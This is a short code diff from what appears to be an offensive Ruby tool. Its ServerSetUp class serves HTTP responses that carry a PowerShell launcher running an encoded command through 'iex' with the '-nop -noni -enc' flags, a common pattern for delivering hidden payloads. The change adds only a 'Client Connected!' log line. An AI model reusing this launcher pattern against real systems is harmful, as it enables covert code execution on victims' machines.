@@ -173,6 +173,7 @@ class ServerSetUp
     resp << %($cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";})
     loop {
       Thread.start(server.accept) do |client|
+        print_info("Client Connected!\n")
         headers = ["HTTP/1.1 200 OK",
                    "Date: #{time}",
                    "Server: Ruby",
